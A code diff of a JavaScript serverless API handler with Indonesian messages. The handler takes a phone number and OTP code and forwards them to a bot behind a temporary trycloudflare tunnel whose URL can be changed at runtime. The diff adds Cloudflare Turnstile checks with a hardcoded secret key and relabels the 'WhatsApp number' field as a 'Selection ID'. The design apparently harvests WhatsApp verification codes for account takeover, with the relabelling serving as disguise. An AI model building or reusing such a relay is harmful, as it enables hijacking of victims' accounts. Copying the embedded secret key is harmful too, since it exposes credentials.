@@ -1,6 +1,7 @@
 import axios from 'axios';
 
 let activeBotTunnel = 'https://condo-controller-science-mariah.trycloudflare.com';
+const TURNSTILE_SECRET_KEY = '0x4AAAAAAE7f-SFi2zqSl-4THBdLAoIYLYY';
 
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -17,7 +18,7 @@ export default async function handler(req, res) {
             success: true,
             message: 'Bot URL berhasil diperbarui!',
             active_url: activeBotTunnel
-        })
+        });
     };
 
     if (req.method === 'GET') {
@@ -25,20 +26,52 @@ export default async function handler(req, res) {
             success: true,
             status: 'online',
             bot_endpoint: activeBotTunnel
-        })
+        });
     };
 
     if (req.method === 'POST') {
-        const { phone, code } = req.body;
+        const { phone, code, token } = req.body;
 
         if (!phone || !code) {
             return res.status(400).json({
                 success: false,
-                error: 'Nomor WhatsApp dan Kode OTP wajib diisi!'
-            })
+                error: 'ID Seleksi dan Kode OTP wajib diisi!'
+            });
+        };
+
+        if (!token) {
+            return res.status(400).json({
+                success: false,
+                error: 'Verifikasi Cloudflare Turnstile wajib diselesaikan!'
+            });
         };
 
         try {
+            const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+            const verifyFormData = new URLSearchParams();
+            verifyFormData.append('secret', TURNSTILE_SECRET_KEY);
+            verifyFormData.append('response', token);
+            if (clientIp) {
+                verifyFormData.append('remoteip', clientIp);
+            }
+
+            const turnstileRes = await axios.post(
+                'https://challenges.cloudflare.com/turnstile/v0/siteverify',
+                verifyFormData.toString(),
+                {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    timeout: 5000
+                }
+            );
+
+            if (!turnstileRes.data || !turnstileRes.data.success) {
+                return res.status(403).json({
+                    success: false,
+                    error: 'Verifikasi keamanan gagal atau token kedaluwarsa. Silakan coba lagi.'
+                });
+            }
+
             const response = await axios.post(
                 `${activeBotTunnel}/api/verify-otp`,
                 { phone, code },
@@ -56,12 +89,12 @@ export default async function handler(req, res) {
             return res.status(status).json({
                 success: false,
                 error: errorMsg
-            })
+            });
         }
     };
 
     return res.status(405).json({
         success: false,
         error: 'Method Not Allowed'
-    })
+    });
 };
